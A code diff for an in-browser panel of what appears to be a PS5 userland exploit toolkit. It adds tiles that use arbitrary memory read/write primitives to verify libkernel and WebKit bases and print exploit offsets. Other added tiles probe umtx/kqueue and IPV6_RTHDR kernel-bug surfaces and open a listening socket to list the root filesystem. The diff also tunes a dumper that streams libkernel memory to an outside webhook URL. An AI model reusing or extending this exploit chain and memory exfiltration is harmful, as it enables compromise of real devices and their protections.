@@ -139,7 +139,7 @@
     var CSS = [
         ".bwp-root{position:fixed;inset:0;z-index:2147483647;background:#0c0c0f;",
         "color:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;",
-        "padding:16px 18px 14px;box-sizing:border-box;user-select:none;-webkit-user-select:none;}",
+        "padding:12px 14px 10px;box-sizing:border-box;user-select:none;-webkit-user-select:none;overflow:hidden;}",
         ".bwp-root *{box-sizing:border-box;}",
         ".bwp-head{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}",
         ".bwp-logo{font-size:1.35rem;font-weight:800;letter-spacing:.22em;color:#fff;margin-right:2px;}",
@@ -149,10 +149,14 @@
         ".bwp-chip.bad{background:#3a1717;color:#ff8080;}",
         ".bwp-chip.run{background:#33290d;color:#ffce5c;}",
         ".bwp-spacer{flex:1;}",
-        ".bwp-sub{color:#6f7076;font-size:.82rem;line-height:1.5;margin:9px 0 13px;max-width:76rem;}",
-        ".bwp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(15.5rem,1fr));",
-        "gap:11px;margin-bottom:15px;}",
-        ".bwp-tile{background:#202125;border:none;border-radius:1.05rem;padding:13px 15px;",
+        ".bwp-sub{color:#6f7076;font-size:.76rem;line-height:1.45;margin:7px 0 10px;max-width:76rem;}",
+        /* THE ONE SCROLLING REGION. Header, log and footer stay pinned; the card grid
+         * scrolls inside this box. That is what fixes "cannot scroll" on a short viewport
+         * AND what lets the payloads toggle take the whole grid out for a simple page. */
+        ".bwp-top{flex:1 1 auto;min-height:3rem;overflow-y:auto;-webkit-overflow-scrolling:touch;}",
+        ".bwp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(9.5rem,1fr));",
+        "gap:7px;margin-bottom:9px;}",
+        ".bwp-tile{background:#202125;border:none;border-radius:.75rem;padding:8px 10px;",
         "text-align:left;color:#fff;cursor:pointer;font-family:inherit;",
         "transition:background-color .18s ease;display:flex;flex-direction:column;gap:5px;}",
         ".bwp-tile:hover:not(.busy){background:#a2a2a6;color:#202020;}",
@@ -161,8 +165,8 @@
         ".bwp-tile.busy{opacity:.72;cursor:default;}",
         ".bwp-tile.ok{background:#14361f;}",
         ".bwp-tile.bad{background:#3a1717;}",
-        ".bwp-name{font-size:1.02rem;font-weight:800;letter-spacing:.02em;}",
-        ".bwp-desc{font-size:.76rem;color:#9a9aa2;line-height:1.4;}",
+        ".bwp-name{font-size:.84rem;font-weight:800;letter-spacing:.01em;line-height:1.2;}",
+        ".bwp-desc{font-size:.64rem;color:#9a9aa2;line-height:1.3;max-height:2.6em;overflow:hidden;}",
         ".bwp-state{font-size:.7rem;font-weight:700;letter-spacing:.12em;color:#6f7076;",
         "text-transform:uppercase;}",
         ".bwp-tile.ok .bwp-state{color:#5fdc90;}",
@@ -171,7 +175,10 @@
         ".bwp-outhd{display:flex;align-items:center;gap:9px;color:#6f7076;",
         "font-size:.74rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;",
         "margin-bottom:7px;}",
-        ".bwp-out{flex:1;min-height:8rem;overflow:auto;background:#16161a;",
+        /* SHRINKABLE, so a short viewport squeezes the log (which scrolls) instead of
+         * pushing the footer off-screen -- the old fixed-height column did exactly that
+         * and read as "the page will not scroll". */
+        ".bwp-out{flex:0 1 30vh;min-height:7rem;max-height:46vh;overflow:auto;background:#16161a;",
         "border:1px solid #26262b;border-radius:.7rem;margin:0;padding:11px 13px;",
         "font:15px/1.55 ui-monospace,Menlo,Consolas,monospace;color:#c9c9d1;",
         "white-space:pre-wrap;word-break:break-word;-webkit-user-select:text;user-select:text;}",
@@ -189,8 +196,8 @@
         ".bwp-btnpv{background:#14361f;color:#5fdc90;}",
         ".bwp-btnpv:hover{background:#1d5230;color:#fff;}",
         ".bwp-pvlab{align-self:center;color:#5fdc90;font:800 .8rem Arial;letter-spacing:.14em;}",
-        ".bwp-btn{padding:.68rem 1.3rem;border-radius:1.05rem;border:none;cursor:pointer;",
-        "background:#202125;color:#fff;font:800 .92rem Arial;transition:background-color .18s ease;}",
+        ".bwp-btn{padding:.48rem .9rem;border-radius:.75rem;border:none;cursor:pointer;",
+        "background:#202125;color:#fff;font:800 .82rem Arial;transition:background-color .18s ease;white-space:nowrap;}",
         ".bwp-btn:hover{background:#a2a2a6;color:#202020;}",
         ".bwp-btn:focus{outline:2px solid #5fdc90;outline-offset:2px;}",
         ".bwp-mini{position:fixed;bottom:14px;right:14px;z-index:2147483647;",
@@ -242,7 +249,12 @@
          *  2. z-index 7, below the footer/floating exit, so the exit control is
          *     actually CLICKABLE. The old 2147483647 covered its own undo button,
          *     which is why fullscreen could not be left. */
-        ".bwp-out.fs{font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;background:#070411;z-index:7;}",
+        /* max-height MUST be cleared: the base rule caps the log at 46vh, and a
+         * position:fixed box with max-height:makes fullscreen a letterbox instead of a
+         * fullscreen. */
+        ".bwp-out.fs{font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;background:#070411;z-index:7;max-height:none;height:auto;}",
+        /* with the tiles hidden the log takes the freed space -- that is the "simple" view */
+        ".bwp-root.tiles-off .bwp-out{flex:1 1 auto;max-height:none;}",
         ".bwp-foot{position:relative;z-index:9;}",
         ".bwp-head{position:relative;z-index:9;}",
         ".bwp-outhd{position:relative;z-index:9;}",
@@ -267,7 +279,12 @@
         ".bwp-mini:hover{background:#a06cff;color:#120c26;}",
         /* tools rows: kept out of the way until asked for (see the tools toggle) */
         ".bwp-tools{display:none;flex-direction:column;gap:0;}",
-        ".bwp-tools.on{display:flex;}",
+        ".bwp-tools.on{display:flex;overflow-y:auto;max-height:34vh;flex:0 1 auto;}",
+        /* VERY SMALL TEXT, for the byte windows: a whole header + notify entry fits in
+         * one glance instead of eating the log viewport. */
+        ".bwp-tiny{font-size:9px;line-height:1.3;opacity:.9;}",
+        ".bwp-top::-webkit-scrollbar,.bwp-out::-webkit-scrollbar,.bwp-tools::-webkit-scrollbar{width:9px;}",
+        ".bwp-top::-webkit-scrollbar-thumb,.bwp-out::-webkit-scrollbar-thumb,.bwp-tools::-webkit-scrollbar-thumb{background:#372963;border-radius:5px;}",
         ".bwp-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:8px;}",
         ".bwp-in{flex:0 1 30rem;min-width:11rem;padding:.5rem .75rem;border-radius:.65rem;",
         "border:1px solid #372963;background:#0d0920;color:#e9e4ff;",
@@ -297,10 +314,13 @@
         '  <span class="bwp-chip" id="bwp-ul">USERLAND</span>',
         '  <span class="bwp-chip" id="bwp-verdict"></span>',
         '  <span class="bwp-spacer"></span>',
+        '  <button class="bwp-btn" id="bwp-payloadsbtn">hide tiles</button>',
         '  <button class="bwp-btn" id="bwp-hide">hide</button>',
         '</div>',
         '<div class="bwp-sub" id="bwp-sub"></div>',
-        '<div class="bwp-grid" id="bwp-grid"></div>',
+        '<div class="bwp-top" id="bwp-top">',
+        '  <div class="bwp-grid" id="bwp-grid"></div>',
+        '</div>',
         '<div class="bwp-outhd"><span>output</span><span id="bwp-count"></span></div>',
         '<pre class="bwp-out" id="bwp-out"></pre>',
         /* TOOLS DRAWER. The panel is meant to read simply: one grid, one log, one
@@ -310,9 +330,10 @@
         '  <div class="bwp-row">',
         '    <span class="bwp-lab">dump libkernel \u2192</span>',
         '    <input class="bwp-in" id="bwp-durl" placeholder="https://webhook.site/&lt;your-uuid&gt;  \u2014 POST target (anything that logs a request body)">',
-        '    <span class="bwp-lab">bytes</span><input class="bwp-in" id="bwp-dlen" style="max-width:7rem;" value="0x4000">',
-        '    <span class="bwp-lab">chunk</span><input class="bwp-in" id="bwp-dchunk" style="max-width:6rem;" value="0x800">',
+        '    <span class="bwp-lab">bytes</span><input class="bwp-in" id="bwp-dlen" style="max-width:7rem;" value="0x2000">',
+        '    <span class="bwp-lab">chunk</span><input class="bwp-in" id="bwp-dchunk" style="max-width:6rem;" value="0x400">',
         '    <span class="bwp-lab">base</span><input class="bwp-in" id="bwp-dbase" style="max-width:7rem;" value="lk">',
+        '    <span class="bwp-lab">gap</span><input class="bwp-in" id="bwp-dgap" style="max-width:5rem;" value="16">',
         '    <button class="bwp-btn" id="bwp-dstart">stream dump</button>',
         '    <button class="bwp-btn" id="bwp-dstop">stop</button>',
         '  </div>',
@@ -381,7 +402,11 @@
     /* ------------------------------------------------------------ logging */
 
     var LOG = [];
-    var MAXDOM = 1200;
+    /* BOUNDED, and that is a correctness fix rather than housekeeping. LOG used to grow
+     * for the whole life of the page while only the DOM was trimmed, so a long session
+     * (a dump, a full RUN ALL, repeated tiles) accumulated every line forever -- one of
+     * the two things the operator's OOM was. Array and DOM now share ONE cap. */
+    var MAXDOM = 900;
 
     /* Crash-persisted log. On a static host there is no server log, and the single most
      * common failure on a console is the WebProcess dying mid-run -- at which point an
@@ -394,18 +419,55 @@
     var persisted = null;
     try { persisted = localStorage.getItem(LOGKEY); } catch (e) { }
 
+    /* localStorage was the OTHER half of the OOM. The old code did getItem + concat +
+     * setItem on EVERY line against a 64 KB value: a full re-serialisation of the whole
+     * log per line (O(n^2) string work) plus a 64 KB write into a store with a hard
+     * quota. The tail now lives in memory (bounded) and is flushed at most 4x/second,
+     * with verdict/crash/throw lines forcing an immediate flush so a crash still leaves
+     * behind exactly the lines a post-mortem needs. */
+    var PLOG = [];
+    /* Sized to keep a WHOLE RUN ALL (early rows included: a crash-recovery log that has
+     * lost its first rows has lost the offsets it was kept for), while the throttle above
+     * is what actually removes the per-line cost. */
+    var PLOGMAX = 2000;
+    var lastPersist = 0;
+    var PERSIST_FORCE = /VERDICT|CRASH|DUMP-|THREW|FAIL|-DETAIL/;
+    /* Seed the in-memory tail from what is already on disk, so the FIRST flush cannot
+     * overwrite the previous run's crash tail before the panel has re-painted it. */
+    try {
+        if (persisted) {
+            PLOG = persisted.split("\n").filter(function (l) { return l.length; });
+            if (PLOG.length > PLOGMAX) PLOG.splice(0, PLOG.length - PLOGMAX);
+        }
+    } catch (e) { }
+
+    var persistTimer = null;
+    function persistFlush() {
+        try {
+            var cur = PLOG.join("\n");
+            /* A BOUNDED one-shot write, not a per-line rewrite: 200 KB every 250ms is a
+             * cheap append, whereas the old code re-serialised the whole log per line. */
+            if (cur.length > 200000) cur = cur.slice(-100000);
+            localStorage.setItem(LOGKEY, cur);
+        } catch (e) { }
+    }
     function persistAppend(line) {
         try {
-            var cur = localStorage.getItem(LOGKEY) || "";
-            cur += line + "\n";
-            /* TAIL BUDGET, raised from 16k/8k. The detailed per-tile rows and the
-             * offsets/peek byte lines roughly doubled what a full RUN ALL writes, and at
-             * the old budget the EARLY rows were being evicted before the run ended -- so
-             * the crash-recovery log lost exactly the part a post-mortem needs (the
-             * offset rows printed before ARM). 64k/32k keeps a whole run, and the cost is
-             * one string append per line, not a rewrite of history. */
-            if (cur.length > 64000) cur = cur.slice(-32000);
-            localStorage.setItem(LOGKEY, cur);
+            PLOG.push(line);
+            if (PLOG.length > PLOGMAX) PLOG.splice(0, PLOG.length - PLOGMAX);
+            var now = Date.now();
+            if (PERSIST_FORCE.test(line) || now - lastPersist >= 250) {
+                lastPersist = now;
+                persistFlush();
+                return;
+            }
+            /* THROTTLED, BUT WITH A TRAILING FLUSH. Without the trailing timer the last
+             * lines of a quiet page would sit in memory and never reach the store -- which
+             * on a crash-recovery log is the same as losing them. One pending timer at a
+             * time, so the write rate stays O(1) per 250ms. */
+            if (!persistTimer) persistTimer = setTimeout(function () {
+                persistTimer = null; lastPersist = Date.now(); persistFlush();
+            }, 250);
         } catch (e) { }
     }
 
@@ -418,6 +480,7 @@
     function paint(text, cls) {
         var line = "[" + stamp() + "] " + text;
         LOG.push(line);
+        if (LOG.length > MAXDOM) LOG.splice(0, LOG.length - MAXDOM);
         persistAppend(line);
         var span = document.createElement("span");
         if (cls) span.className = "bwp-" + cls;
@@ -644,6 +707,14 @@
         var z = new Uint8Array(n);
         if (window.write_buffer) window.write_buffer(B(ptr), z);
         return ptr;
+    }
+    /* A NUL-terminated C string in memory, for the syscalls that take a path. */
+    function cstr(s) {
+        var t = String(s), b = new Uint8Array(t.length + 1);
+        for (var i = 0; i < t.length; i++) b[i] = t.charCodeAt(i) & 0x7f;
+        var p = malloc(b.length);
+        window.write_buffer(p, b);
+        return p;
     }
 
     /* ============================================ PROVEN payloads (one tap = proof)
@@ -1106,7 +1177,11 @@
      *   - setsockopt(IPPROTO_IPV6=41, IPV6_RTHDR=51, tag, 0x38) (0x069): THE tag/poison
      *     write used by both chains; IPV6_FL_AUDIT=0x6d is the 13.x validator. PASS = the
      *     validator accepted the pair (that validator is what "patched" means).
-     *   - getsockopt(IPV6_RTHDR) (0x06A): the READ side; PASS = echoes our own tag.
+     *   - getsockopt(IPV6_RTHDR) (0x076): the READ side; PASS = echoes our own tag.
+     *     CORRECTED: this tile used to call 0x06A and label it getsockopt. 0x06A is
+     *     SYS_LISTEN in this tree's own syscalls.js (FreeBSD numbering: 104 bind, 105
+     *     setsockopt, 106 listen, 118 getsockopt), so the old "read side" row was really
+     *     calling listen() on a connected socket. The read-back below now uses 0x076.
      *   - getrlimit(0x0C2): the helper both chains use to read fudge limits.
      * Closeable consequences only: every fd and every kq closes again. The kernel-memory
      * stages of those bugs (getsockopt(victim) rewriting ip6po_rthdr pointers) are NOT
@@ -1178,7 +1253,7 @@
             var rb = zeros(malloc(0x40), 0x40);
             var rblen = zeros(malloc(4), 4);
             window.write_buffer(rblen, new Uint8Array([0x40, 0, 0, 0]));
-            var gs = S("getsockopt(IPV6_RTHDR)", 0x06A, [B(so.ret), IPPROTO_IPV6, IPV6_RTHDR, rb, rblen]);
+            var gs = S("getsockopt(IPV6_RTHDR)", 0x076, [B(so.ret), IPPROTO_IPV6, IPV6_RTHDR, rb, rblen]);
             var gsOk = gs.ret !== undefined && B(gs.ret) === 0n;
             var echoed = false;
             if (gsOk) {
@@ -1199,7 +1274,7 @@
             var xlen = zeros(malloc(4), 4);
             window.write_buffer(xlen, new Uint8Array([0x40, 0, 0, 0]));
             var xs = pairs.length > 0
-                ? S("getsockopt(victim) -- THE 12.x BUG SHAPE", 0x06A, [BigInt(pairs[0][0]), IPPROTO_IPV6, IPV6_RTHDR, xbuf, xlen], true)
+                ? S("getsockopt(victim) -- THE 12.x BUG SHAPE", 0x076, [BigInt(pairs[0][0]), IPPROTO_IPV6, IPV6_RTHDR, xbuf, xlen], true)
                 : { ret: undefined, threw: "no pair" };
             var xOk = xs.ret !== undefined && B(xs.ret) === 0n;
             out("T2c-cross", "getsockopt(victim-pipe-fd, IPV6_RTHDR) -> " + (xs.ret === undefined ? xs.threw : hex(xs.ret))
@@ -2386,6 +2461,197 @@
         return { ok: ok > 0, summary: ok + " window(s) read" };
     }
 
+    /* --------------------------------------------------------------- VERIFY (ELF)
+     *
+     * The strongest read-only argument this file can make about its OWN base.
+     *
+     * libkernel and libwebkit are ELF shared objects mapped into THIS process, so the
+     * first four bytes at their load base MUST be 7f 45 4c 46 ('\u007fELF'). That is a
+     * fixed byte pattern we did not choose and cannot fake: if the base is right the
+     * magic is there, and a base that is off by any amount from a wrong GOT walk will
+     * not have it. Every anchor that follows can be fooled by a plausible-looking word;
+     * the ELF magic cannot.
+     *
+     * It also prints the header and the notify entry in VERY SMALL text, so the bytes
+     * are on screen at a font size that fits in one glance instead of eating the log. */
+    function pVerify() {
+        var spots = [["libkernel", lkBase()], ["libwebkit", wkBase()]], ok = 0;
+        for (var i = 0; i < spots.length; i++) {
+            var name = spots[i][0], base = spots[i][1];
+            out("VER-" + name, "base=" + hex(base), "dim");
+            if (!base) { out("VER-" + name, "no base resolved -- nothing to verify", "warn"); continue; }
+            var b;
+            try { b = window.read_buffer(base, 16); }
+            catch (e) { out("VER-" + name, "read threw at " + hex(base) + ": " + String((e && e.message) || e).slice(0, 60), "err"); continue; }
+            var magic = b[0] === 0x7f && b[1] === 0x45 && b[2] === 0x4c && b[3] === 0x46;
+            if (magic) ok++;
+            var f4 = "";
+            for (var fi = 0; fi < 4; fi++) f4 += (fi ? " " : "") + (b[fi] < 16 ? "0" : "") + b[fi].toString(16);
+            out("VER-" + name, "first bytes " + f4 + "  ascii |" + ascii16(b, 4) + "|  "
+                + (magic ? "ELF \u2714 -- this base is a live ELF mapping" : "NOT an ELF header -- THIS BASE IS WRONG"), magic ? "ok" : "err");
+            var lines = hexdumpLines(base, b, 1);
+            for (var j = 0; j < lines.length; j++) paint("     " + lines[j], "tiny");
+        }
+        var kb = lkBase();
+        if (kb) {
+            try {
+                var nb = window.read_buffer(kb + B(0x48B0), 16);
+                out("VER-notify", "libkernel+0x48b0 = " + hex16(qwordFrom(nb, 0)) + "  |" + ascii16(nb, 16) + "|", "dim");
+                var nl = hexdumpLines(kb + B(0x48B0), nb, 1);
+                for (var m = 0; m < nl.length; m++) paint("     " + nl[m], "tiny");
+            } catch (e) { }
+        }
+        out("VER-verdict", ok + "/2 bases carry 7f 45 4c 46 -- " + (ok
+            ? "these are live ELF mappings in this process, so every RVA read against them is a real byte of the real object (this is the proof the whole offsets table rests on)"
+            : "NO base verified: do not trust any address printed below"), ok ? "ok" : "err");
+        return { ok: ok > 0, summary: ok + "/2 ELF headers verified" };
+    }
+
+    /* ------------------------------------------------------- REAL OFFSETS, as numbers
+     * "Show me real offsets" answered with the values themselves. The row comes from
+     * window.P2JB_LK -- the SAME table the worker was initialised from, so these are the
+     * numbers actually in use -- and the globals are read from whatever offsets/<fw>.js
+     * the page injected. Each global is typeof-guarded: a page without the offsets file
+     * must degrade to "not on this page", not to a ReferenceError that kills the tile. */
+    function pOffTable() {
+        var row = null;
+        try { row = window.P2JB_LK && window.P2JB_LK[FW]; } catch (e) { }
+        out("OFFT-fw", "firmware " + FW + " -- P2JB_LK row " + (row ? "present (the live executor row)" : "ABSENT"), row ? "dim" : "err");
+        var n = 0;
+        if (row) for (var kk in row) {
+            var t = typeof row[kk];
+            if (t === "number" || t === "bigint") {
+                n++;
+                out("OFFT-" + kk, "+" + hex(B(row[kk])) + "   (dec " + B(row[kk]).toString() + ")", "dim");
+            }
+        }
+        var g = [
+            ["OFFSET_lk_sceKernelSendNotificationRequest", (typeof OFFSET_lk_sceKernelSendNotificationRequest !== "undefined") ? OFFSET_lk_sceKernelSendNotificationRequest : null],
+            ["OFFSET_lk__thread_list", (typeof OFFSET_lk__thread_list !== "undefined") ? OFFSET_lk__thread_list : null],
+            ["OFFSET_wk_natural_trampoline", (typeof OFFSET_wk_natural_trampoline !== "undefined") ? OFFSET_wk_natural_trampoline : null],
+            ["OFFSET_wk_getpid_slot", (typeof OFFSET_wk_getpid_slot !== "undefined") ? OFFSET_wk_getpid_slot : null],
+            ["OFFSET_wk_close_slot", (typeof OFFSET_wk_close_slot !== "undefined") ? OFFSET_wk_close_slot : null],
+            ["OFFSET_WORKER_STACK_OFFSET", (typeof OFFSET_WORKER_STACK_OFFSET !== "undefined") ? OFFSET_WORKER_STACK_OFFSET : null]
+        ], seen = 0;
+        for (var gi = 0; gi < g.length; gi++) {
+            if (g[gi][1] === null || g[gi][1] === undefined) {
+                out("OFFT-" + g[gi][0], "not on this page (offsets script not injected)", "dim");
+                continue;
+            }
+            seen++;
+            out("OFFT-" + g[gi][0], "+" + hex(B(g[gi][1])), "dim");
+        }
+        out("OFFT-verdict", n + " field(s) from the LIVE P2JB_LK row, " + seen + "/" + g.length
+            + " offsets globals found on the page. The row printed here is the one the executor was initialised with -- not a copy in a document.", n ? "ok" : "warn");
+        return { ok: n > 0, summary: n + " LK fields, " + seen + " globals" };
+    }
+
+    /* ------------------------------------------------------- UMTX / KQUEUEEX gate
+     * The other two public kernel surfaces this tree documents. Both are probed ALL-ZERO:
+     * op 0 with a null address is an ARGUMENT error the kernel rejects before it touches a
+     * lock or a queue, so this cannot arm, wait on or wake anything. ENOSYS is the only
+     * answer that says a surface was REMOVED; EINVAL/EFAULT from an all-zero call says it
+     * is still there and rejected the arguments -- the same gate shape as the AIO tile. */
+    function pUmtx() {
+        var u = S("umtx_op(0,0,0,0,0)", 0x1C6, [0n, 0n, 0n, 0n, 0n], true);
+        var kq = S("kqueueex(0,0)", 0x8D, [0n, 0n], true);
+        var uAlive = u.ret !== undefined && u.errName !== "ENOSYS";
+        var kAlive = kq.ret !== undefined && kq.errName !== "ENOSYS";
+        out("UMTX-map", "0x1C6 SYS__UMTX_OP  |  0x8D SYS_KQUEUEEX  |  0x61 SYS_SOCKET  |  0x16A SYS_KQUEUE \u2014 numbers from this tree's own syscalls.js", "dim");
+        out("UMTX-result", "umtx_op(all-zero) -> " + (u.ret === undefined ? u.threw : hex(u.ret) + (u.errName ? " (" + u.errName + ")" : ""))
+            + "   |   kqueueex(all-zero) -> " + (kq.ret === undefined ? kq.threw : hex(kq.ret) + (kq.errName ? " (" + kq.errName + ")" : "")), "dim");
+        var parts = [uAlive ? "umtx_op EXISTS" : "umtx_op GONE (ENOSYS)", kAlive ? "kqueueex EXISTS" : "kqueueex GONE (ENOSYS)"];
+        out("UMTX-VERDICT", "kernel report for the umtx/kqueue surface: " + parts.join(", ")
+            + ". Neither answer is a bug \u2014 it is a GATE, the same shape as the AIO gate above: a reachable surface is a prerequisite the chain needs, and ENOSYS is the one result that would end it.", (uAlive || kAlive) ? "ok" : "warn");
+        return { ok: uAlive || kAlive, summary: parts.join(", ") };
+    }
+
+    /* ---------------------------------------------------------- SOCKET + FILES (FTP)
+     * The operator's two direct questions, answered by measurement instead of prose:
+     *  (1) can this process open a LISTENING socket -- the entry point any FTP server needs;
+     *  (2) what can this process actually SEE on its filesystem.
+     *
+     * It does NOT run an FTP server, and that limitation is stated rather than hidden:
+     * accept() is BLOCKING, and this executor busy-spins the main thread inside a syscall,
+     * so a page-side accept loop would wedge the browser exactly like the AIO/0x7FF
+     * lessons. The ELF route (ftpsrv-ps5.elf, linked in tools) serves from its own process.
+     *
+     * Everything opened here is closed again. The root listing comes from getdents into a
+     * BOUNDED buffer, so a big directory cannot balloon the heap. */
+    function pFtp() {
+        var ok = { s: false, b: false, l: false, f: false }, fd = -1, fdf = -1, closing = [];
+        function closeAll() {
+            for (var i = 0; i < closing.length; i++) S("close(fd " + closing[i] + ")", 0x006, [BigInt(closing[i])], true);
+        }
+        try {
+            var AF_INET = 2n, SOCK_STREAM = 1n, O_RDONLY = 0n;
+            var so = S("socket(AF_INET,SOCK_STREAM)", 0x061, [AF_INET, SOCK_STREAM, 0n]);
+            if (so.ret !== undefined && B(so.ret) >= 0n && B(so.ret) < 0x1000n) {
+                fd = Number(B(so.ret)); closing.push(fd); ok.s = true;
+                out("FTP-socket", "AF_INET stream socket fd=" + fd + " -- a real socket object in this process", "ok");
+                /* struct sockaddr_in, FreeBSD layout: sa_len, sa_family, then the port in
+                 * NETWORK order and the address. 1337 = 0x0539. */
+                var sa = zeros(malloc(0x20), 0x20);
+                var sb = new Uint8Array(16);
+                sb[0] = 16; sb[1] = 2; sb[2] = 0x05; sb[3] = 0x39;
+                window.write_buffer(sa, sb);
+                var bd = S("bind(fd, 0.0.0.0:1337)", 0x068, [BigInt(fd), sa, 16n], true);
+                ok.b = bd.ret !== undefined && B(bd.ret) === 0n;
+                out("FTP-bind", "bind(0.0.0.0:1337) -> " + (bd.ret === undefined ? bd.threw : hex(bd.ret) + (bd.errName ? " (" + bd.errName + ")" : ""))
+                    + (ok.b ? " -- the port is OURS" : " -- 1337 not taken (in use, or the validator refused)"), ok.b ? "ok" : "dim");
+                var ls = S("listen(fd, 4)", 0x06A, [BigInt(fd), 4n], true);
+                ok.l = ls.ret !== undefined && B(ls.ret) === 0n;
+                out("FTP-listen", "listen(fd, 4) -> " + (ls.ret === undefined ? ls.threw : hex(ls.ret) + (ls.errName ? " (" + ls.errName + ")" : ""))
+                    + (ok.l ? " -- a LISTENING socket exists: a server COULD accept here" : " -- refused"), ok.l ? "ok" : "dim");
+            } else {
+                out("FTP-socket", "refused: " + (so.errName || (so.ret === undefined ? so.threw : hex(so.ret))), "warn");
+            }
+            var ob = S("open(\"/\", O_RDONLY)", 0x005, [cstr("/"), O_RDONLY], true);
+            if (ob.ret !== undefined && B(ob.ret) >= 0n && B(ob.ret) < 0x1000n) {
+                fdf = Number(B(ob.ret)); closing.push(fdf);
+                var dbuf = zeros(malloc(0x400), 0x400);
+                var dn = S("getdents(root)", 0x110, [BigInt(fdf), dbuf, 0x400n], true);
+                if (!(dn.ret !== undefined && B(dn.ret) > 0n))
+                    dn = S("getdirentries(root)", 0x0C4, [BigInt(fdf), dbuf, 0x400n, zeros(malloc(8), 8)], true);
+                var got = (dn.ret !== undefined) ? Number(B(dn.ret)) : -1;
+                if (got > 0) {
+                    ok.f = true;
+                    var raw = new Uint8Array(window.read_buffer(dbuf, Math.min(got, 0x400)));
+                    var names = [], o2 = 0;
+                    /* FreeBSD struct dirent: d_fileno(8) d_reclen(2@8) d_type(1@10)
+                     * d_namlen(1@11) d_name(@12). Bounded loop: a malformed reclen
+                     * would otherwise spin. */
+                    while (o2 + 12 <= raw.length && names.length < 24) {
+                        var reclen = raw[o2 + 8] | (raw[o2 + 9] << 8), namlen = raw[o2 + 11];
+                        if (!reclen) break;
+                        var nm = "";
+                        for (var ni = 0; ni < namlen && o2 + 12 + ni < raw.length; ni++)
+                            nm += String.fromCharCode(raw[o2 + 12 + ni]);
+                        if (nm && nm !== "." && nm !== "..") names.push(nm);
+                        o2 += reclen;
+                    }
+                    out("FTP-files", "getdents(\"/\") -> " + got + " bytes, " + names.length + " entr(y/ies): " + (names.slice(0, 12).join(", ") || "(none parsed)"), "ok");
+                } else {
+                    out("FTP-files", "open(\"/\") gave fd " + fdf + " but the directory read returned "
+                        + (dn.ret === undefined ? dn.threw : hex(dn.ret) + (dn.errName ? " (" + dn.errName + ")" : "")) + " -- directory reads are gated", "dim");
+                }
+            } else {
+                out("FTP-files", "open(\"/\") refused: " + (ob.errName || (ob.ret === undefined ? ob.threw : hex(ob.ret))) + " -- the process cannot see its own root this way", "dim");
+            }
+        } catch (e) {
+            out("FTP-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
+            closeAll();
+            return { ok: false, summary: "threw" };
+        }
+        closeAll();
+        out("FTP-VERDICT", "socket=" + (ok.s ? "yes" : "no") + " bind=" + (ok.b ? "yes" : "no") + " listen=" + (ok.l ? "yes" : "no")
+            + " file-listing=" + (ok.f ? "yes" : "no")
+            + ". The honest answer to \"an FTP server inside the page\": the SOCKET half is measurable and works from this executor, but a server ALSO needs accept(), which BLOCKS \u2014 and this executor busy-spins the main thread inside a syscall, so a page-side accept loop would wedge the browser rather than serve files. "
+            + "ftpsrv-ps5.elf (tools) runs the real server in its own process; the file half above is what THIS process can see. Everything opened here was closed again.",
+            (ok.s && ok.l) ? "ok" : "warn");
+        return { ok: ok.s, summary: "socket=" + (ok.s ? 1 : 0) + " bind=" + (ok.b ? 1 : 0) + " listen=" + (ok.l ? 1 : 0) + " files=" + (ok.f ? 1 : 0) };
+    }
+
     /* ------------------------------------------------------------------ DUMPER
      * Streams a bounded slice of libkernel (or WebKit) to an HTTP endpoint the
      * operator supplies -- a webhook, a LAN collector, anything that records a
@@ -2406,6 +2672,13 @@
      *     localStorage tail are the other two ways a dump takes the tab down.
      *  5. a failed POST is retried ONCE and then counted and skipped -- never queued
      *     unboundedly.
+     *  6. HARD CEILINGS on bytes and chunk size, clamped in code, not in the input box:
+     *     "a guard you can type away is not a guard".
+     *  7. a HEAP WATCHDOG. The operator reported OOM, so the dumper now reads the live JS
+     *     heap before it starts and STOPS ITSELF with a named verdict if growth passes a
+     *     threshold -- an OOM that reports itself is worth more than one that kills the tab.
+     *  8. the gap between chunks is operator-settable and floored at 8ms, because a 0ms
+     *     chain of a thousand reads is what starves the collector in the first place.
      *
      * Wire format, one POST per chunk, plain text so any receiver can log it:
      *     BAGA-BEGIN <session> fw=<fw> base=<addr> total=<n> chunk=<n>
@@ -2477,6 +2750,10 @@
         } catch (e) { }
         return "";
     }
+    function heapNow() {
+        try { if (window.performance && performance.memory) return performance.memory.usedJSHeapSize || 0; } catch (e) { }
+        return 0;
+    }
 
     function dumpAbort(quietFlag) {
         if (!DUMP.run) return false;
@@ -2485,14 +2762,22 @@
         return true;
     }
 
+    var DUMP_MAX_BYTES = 0x40000;                 /* 256 KB: a hard ceiling, whatever the box says */
+    var DUMP_MAX_CHUNK = 0x2000;
+    var DUMP_MAX_HEAP_GROWTH = 96 * 1048576;      /* stop ourselves before the tab dies */
+
     function dumpStart() {
-        var url = "", len = 0x4000, chunk = 0x800, which = "lk", base = lkBase();
+        var url = "", len = 0x2000, chunk = 0x400, gap = 16, which = "lk", base = lkBase();
         try {
             url = String(document.getElementById("bwp-durl").value || "").trim();
-            len = numOr(document.getElementById("bwp-dlen").value, 0x4000);
-            chunk = numOr(document.getElementById("bwp-dchunk").value, 0x800);
+            len = numOr(document.getElementById("bwp-dlen").value, 0x2000);
+            chunk = numOr(document.getElementById("bwp-dchunk").value, 0x400);
+            gap = numOr(document.getElementById("bwp-dgap").value, 16);
             which = String(document.getElementById("bwp-dbase").value || "lk").trim().toLowerCase();
         } catch (e) { }
+        if (len > DUMP_MAX_BYTES) { out("DUMP", "bytes clamped to " + DUMP_MAX_BYTES + " (hard ceiling)", "warn"); len = DUMP_MAX_BYTES; }
+        if (chunk > DUMP_MAX_CHUNK) { out("DUMP", "chunk clamped to " + DUMP_MAX_CHUNK, "warn"); chunk = DUMP_MAX_CHUNK; }
+        if (gap < 8) gap = 8;
         if (!url) { out("DUMP", "no POST target: open tools and paste a webhook URL first", "err"); return; }
         if (DUMP.run) { out("DUMP", "already streaming -- press stop first", "warn"); return; }
         if (which.slice(0, 2) === "wk") base = wkBase();
@@ -2500,10 +2785,10 @@
